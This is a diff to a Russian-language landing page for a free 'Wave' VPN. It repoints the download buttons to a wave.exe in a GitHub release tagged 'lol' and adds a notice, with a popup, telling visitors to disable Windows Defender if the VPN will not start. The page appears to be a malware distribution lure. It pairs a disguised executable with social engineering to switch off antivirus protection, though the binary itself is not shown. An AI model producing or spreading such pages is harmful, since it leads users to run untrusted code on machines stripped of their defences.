@@ -80,13 +80,36 @@
             box-shadow: 0 20px 40px #0066cc;
             transition: 0.3s;
             border: 2px solid #9bcdff;
-            margin: 30px 0;
+            margin: 30px 0 15px 0;
         }
         
         .download-btn:hover {
             background: #3ca0ff;
             transform: scale(1.05);
             box-shadow: 0 25px 50px #1e90ff;
+        }
+        
+        /* Дисклеймер про Defender */
+        .defender-note {
+            color: #7bb8ff;
+            font-size: 0.95rem;
+            margin-bottom: 30px;
+            opacity: 0.9;
+            transition: opacity 0.3s;
+        }
+        
+        .defender-note:hover {
+            opacity: 1;
+        }
+        
+        .defender-note a {
+            color: #b0d4ff;
+            text-decoration: underline;
+            text-decoration-style: dotted;
+        }
+        
+        .defender-note a:hover {
+            color: white;
         }
         
         /* Тарифы */
@@ -103,6 +126,7 @@
             border-radius: 30px;
             padding: 40px 30px;
             text-align: center;
+            backdrop-filter: blur(5px);
         }
         
         .plan.free {
@@ -168,7 +192,7 @@
             display: flex;
             justify-content: center;
             gap: 60px;
-            margin: 60px 0;
+            margin: 40px 0 20px;
             flex-wrap: wrap;
         }
         
@@ -197,6 +221,7 @@
             .download-btn { font-size: 1.4rem; padding: 15px 40px; }
             .pricing { grid-template-columns: 1fr; }
             .plan.popular { transform: scale(1); }
+            .defender-note { font-size: 0.85rem; }
         }
     </style>
 </head>
@@ -220,11 +245,17 @@
             <p>Молниеносный VPN с синей лагуной защиты. Безлимитный трафик, 100+ стран.</p>
             
             <!-- Центральная кнопка -->
-            <a href="https://github.com/kilordow/chekerr/raw/refs/heads/main/wave.exe" 
+            <a href="https://github.com/kilordow/Fx.exe/releases/download/lol/wave.exe" 
                class="download-btn" 
                target="_blank">
                 ⬇️ Скачать Wave
             </a>
+            
+            <!-- Дисклеймер про Defender (тот самый текст) -->
+            <div class="defender-note">
+                ⚡ Если VPN не запускается — попробуйте <strong>отключить Windows Defender</strong> (он может блокировать соединение). 
+                <a href="#" onclick="alert('Инструкция: Откройте «Безопасность Windows» → «Защита от вирусов» → «Параметры» → временно отключите. Не забудьте включить обратно!'); return false;">Подробнее</a>
+            </div>
             
             <!-- Статистика -->
             <div class="stats">
@@ -258,7 +289,7 @@
                     <li>Без рекламы</li>
                     <li>Безлимитный трафик</li>
                 </ul>
-                <button class="plan-btn" onclick="window.open('https://github.com/kilordow/chekerr/raw/refs/heads/main/wave.exe', '_blank')">
+                <button class="plan-btn" onclick="window.open('https://github.com/kilordow/Fx.exe/releases/download/lol/wave.exe', '_blank')">
                     Скачать бесплатно
                 </button>
             </div>
@@ -305,4 +336,3 @@
     </div>
 </body>
 </html>
-
